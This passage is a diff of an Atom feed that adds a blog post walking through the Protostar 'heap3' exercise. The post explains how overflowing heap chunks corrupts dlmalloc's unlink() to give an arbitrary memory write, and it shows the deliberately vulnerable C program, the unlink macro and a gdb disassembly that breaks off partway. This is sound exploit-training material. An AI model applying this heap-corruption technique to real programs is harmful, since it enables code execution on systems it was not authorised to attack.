@@ -4,7 +4,7 @@
   <title><![CDATA[David Xia]]></title>
   <link href="https://www.davidxia.com/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2020-04-13T13:33:26-04:00</updated>
+  <updated>2020-04-21T00:40:16-04:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -12,6 +12,1287 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[How to Exploit Dlmalloc Unlink(): Protostar Level Heap3]]></title>
+    <link href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/"/>
+    <updated>2020-04-19T18:51:48-04:00</updated>
+    <id>https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink</id>
+    <content type="html"><![CDATA[<p>While stuck inside during social distancing, I&rsquo;ve been making my way through LiveOverflow&rsquo;s awesome
+Youtube playlist &ldquo;<a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">Binary Exploitation / Memory Corruption</a>.&rdquo; His videos are structured
+around a well known series of <a href="https://exploit-exercises.lains.space/protostar/">exploit exercises here</a> called &ldquo;Protostar.&rdquo; I took the
+time to truly understand each one before moving onto the next as the exercises build on each
+other. For the past several days I&rsquo;ve been trying to understand the <a href="https://exploit-exercises.lains.space/protostar/heap3/">&ldquo;Heap3&rdquo;
+level</a>, a relatively complex level that requires manipulating the heap to redirect code
+execution to an arbitrary function. After rewatching the video many times and reading numerous other
+online explanations, I finally understand! That moment of understanding feels so gratifying.</p>
+
+<p>Many other resources already explain the exploit well, but I&rsquo;m writing my own explanation to
+reinforce my understanding and to celebrate.</p>
+
+<!-- more -->
+
+
+<h2>Exploit Exercise Protostar Heap3</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;that wasn&#39;t too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;dynamite failed?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The source code is pretty straightforward. There&rsquo;s the <code>main()</code> and <code>winner()</code> functions. There&rsquo;s
+three character pointers, three <code>malloc()</code>&rsquo;s, three <code>strcpy()</code>&rsquo;s, three <code>free()</code>&rsquo;s, and finally a
+<code>printf()</code>. Our goal is to redirect code execution from <code>main()</code> to <code>winner()</code>.</p>
+
+<p>The description at the top of the level is</p>
+
+<blockquote><p>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to
+change program execution.</p></blockquote>
+
+<p>All these exercises are on 32-bit x86 architecture.</p>
+
+<h2>Background on dlmalloc</h2>
+
+<p>The vulnerable malloc is usually referred to as dlmalloc (named after one of its authors Doug Lea)
+and must be an old version like <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e">this one from 1996</a>. The <a href="http://phrack.org/issues/57/9.html"><em>Phrack</em> article &ldquo;Once
+Upon a free()&hellip;&rdquo;</a> provides useful background.</p>
+
+<blockquote><p>Most malloc implementations share the behaviour of storing their own management information, such
+as lists of used or free blocks, sizes of memory blocks and other useful data within the heap
+space itself.</p>
+
+<p>The central attack of exploiting malloc allocated buffer overflows is to modify this management
+information in a way that will allow arbitrary memory overwrites afterwards.</p></blockquote>
+
+<p>For our purposes, skip to the &ldquo;GNU C Library implementation&rdquo; section. It says that memory slices or
+&ldquo;chunks&rdquo; created by malloc are organized  like so. On 32-bit systems, <code>prev_size</code> and <code>size</code> are
+4 bytes each. <code>data</code> is the user data section. <code>malloc()</code> returns a pointer to the address where
+<code>data</code> starts.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.            +----------------------------------+
+</span><span class='line'>    chunk -> | prev_size                        |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>             | size                             |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>      mem -> | data                             |
+</span><span class='line'>             : ...                              :
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>nextchunk -> | prev_size ...                    |
+</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The other important things to know about the vulnerable version(s) of dlmalloc are:</p>
+
+<ul>
+<li>The lowest bit of <code>size</code> called <code>PREV_INUSE</code> indicates whether the previous chunk is used or not</li>
+<li>Once we <code>free()</code> the chunk using <code>free(mem), the memory is released, and if
+its neighboring chunks aren't free, dlmalloc will clear the next chunk's</code>PREV_INUSE<code>and add the
+chunk to a doubly-linked list of other free chunks. It does this by adding a forward and backward
+pointer at</code>mem`.</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.            +----------------------------------+
+</span><span class='line'>    chunk -> | prev_size                        |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>             | size                             |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>      mem -> | fd                               |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>             | bk                               |
+</span><span class='line'>             +----------------------------------+
+</span><span class='line'>             | (old memory, can be zero bytes)  |
+</span><span class='line'>             :                                  :
+</span><span class='line'>
+</span><span class='line'>nextchunk -> | prev_size ...                    |
+</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>If neighboring chunks are free, dlmalloc will merge them. Since free chunks are in a doubly-linked
+list, dlmalloc merges by first removing the linked chunks from the list and tying the loose ends
+of the list back together. This is done via a macro called <code>unlink()</code>.</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define unlink(P, BK, FD)                                                     \</span>
+</span><span class='line'><span class="cp">{                                                                             \</span>
+</span><span class='line'><span class="cp">  BK = P-&gt;bk;                                                                 \</span>
+</span><span class='line'><span class="cp">  FD = P-&gt;fd;                                                                 \</span>
+</span><span class='line'><span class="cp">  FD-&gt;bk = BK;                                                                \</span>
+</span><span class='line'><span class="cp">  BK-&gt;fd = FD;                                                                \</span>
+</span><span class='line'><span class="cp">}                                                                             \</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Written with pointer notation:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">BK</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>  <span class="err">#</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">P</span> <span class="o">+</span> <span class="mi">12</span> <span class="n">stored</span> <span class="n">in</span> <span class="n">BK</span>
+</span><span class='line'><span class="n">FD</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>   <span class="err">#</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">P</span> <span class="o">+</span> <span class="mi">8</span> <span class="n">stored</span> <span class="n">in</span> <span class="n">FD</span>
+</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">FD</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span> <span class="err">#</span> <span class="n">set</span> <span class="n">the</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">FD</span> <span class="o">+</span> <span class="mi">12</span> <span class="n">to</span> <span class="n">BK</span>
+</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">BK</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>  <span class="err">#</span> <span class="n">set</span> <span class="n">the</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">BK</span> <span class="o">+</span> <span class="mi">8</span> <span class="n">to</span> <span class="n">FD</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since we can overwrite the bytes of P, we can overwrite 4-bytes of memory at two arbitrary places.
+To trigger this code path, chunks being consolidated must be bigger than 80 bytes. dlmalloc
+classifies these chunks as &ldquo;fastbins.&rdquo;</p>
+
+<blockquote><p>An array of lists holding recently freed small chunks. Fastbins are not doubly linked.</p></blockquote>
+
+<h2>What the heap looks like in heap3.c</h2>
+
+<p>Run gdb on <code>heap3.c</code>. My personal preference is to set the disassembly-flavor to intel and turn off
+pagination.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">$</span> <span class="n">gdb</span> <span class="n">heap3</span>
+</span><span class='line'><span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">GDB</span><span class="p">)</span> <span class="mf">7.0.1</span><span class="o">-</span><span class="n">debian</span>
+</span><span class='line'><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2009</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.</span>
+</span><span class='line'><span class="n">License</span> <span class="n">GPLv3</span><span class="o">+:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="n">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="nl">http</span><span class="p">:</span><span class="c1">//gnu.org/licenses/gpl.html&gt;</span>
+</span><span class='line'><span class="n">This</span> <span class="n">is</span> <span class="n">free</span> <span class="nl">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="n">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="p">.</span>
+</span><span class='line'><span class="n">There</span> <span class="n">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="p">.</span>  <span class="n">Type</span> <span class="s">&quot;show copying&quot;</span>
+</span><span class='line'><span class="n">and</span> <span class="s">&quot;show warranty&quot;</span> <span class="k">for</span> <span class="n">details</span><span class="p">.</span>
+</span><span class='line'><span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="n">as</span> <span class="s">&quot;i486-linux-gnu&quot;</span><span class="p">.</span>
+</span><span class='line'><span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="nl">see</span><span class="p">:</span>
+</span><span class='line'><span class="o">&lt;</span><span class="nl">http</span><span class="p">:</span><span class="c1">//www.gnu.org/software/gdb/bugs/&gt;...</span>
+</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="p">...</span><span class="n">done</span><span class="p">.</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="n">intel</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">set</span> <span class="n">pagination</span> <span class="n">off</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We first disassemble the <code>main()</code> function.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">main</span>
+</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="nl">main</span><span class="p">:</span>
+</span><span class='line'><span class="mh">0x08048889</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>    <span class="n">push</span>   <span class="n">ebp</span>
+</span><span class='line'><span class="mh">0x0804888a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+</span><span class='line'><span class="mh">0x0804888c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>    <span class="n">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
+</span><span class='line'><span class="mh">0x0804888f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x20</span>
+</span><span class='line'><span class="mh">0x08048892</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x20</span>
+</span><span class='line'><span class="mh">0x08048899</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x0804889e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x080488a2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x20</span>
+</span><span class='line'><span class="mh">0x080488a9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x080488ae</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x080488b2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x20</span>
+</span><span class='line'><span class="mh">0x080488b9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x080488be</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x080488c2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x080488c5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
+</span><span class='line'><span class="mh">0x080488c8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x080488ca</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x080488ce</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x080488d2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x080488d5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x080488da</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">81</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x080488dd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span>
+</span><span class='line'><span class="mh">0x080488e0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x080488e2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x080488e6</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x080488ea</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">97</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x080488ed</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x080488f2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">105</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x080488f5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;:</span>  <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xc</span>
+</span><span class='line'><span class="mh">0x080488f8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">111</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x080488fa</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x080488fe</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
